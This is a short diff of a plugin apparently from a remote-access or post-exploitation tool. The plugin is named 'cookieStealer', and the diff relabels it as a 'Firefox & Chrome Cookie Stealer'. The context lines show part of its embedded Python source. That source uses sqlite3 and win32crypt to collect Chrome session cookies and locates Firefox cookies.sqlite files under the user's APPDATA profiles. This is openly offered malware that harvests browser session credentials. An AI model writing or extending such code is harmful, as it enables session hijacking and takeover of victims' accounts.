@@ -1,5 +1,5 @@
 plugin_name = r"""cookieStealer"""
-plugin_description = r"""Browser Cookies Stealer"""
+plugin_description = r"""Firefox & Chrome Cookie Stealer"""
 r_source = r"""
 import sqlite3
 import win32crypt
@@ -30,6 +30,7 @@ with connection:
             }
         sessions.append(payload)
 cookies['chrome'] = sessions
+
 # Firefox Stealer
 firefox_cookie = glob.glob(os.path.join(os.getenv('APPDATA', ''), 'Mozilla/Firefox/Profiles/*.default/cookies.sqlite'))
 if firefox_cookie:
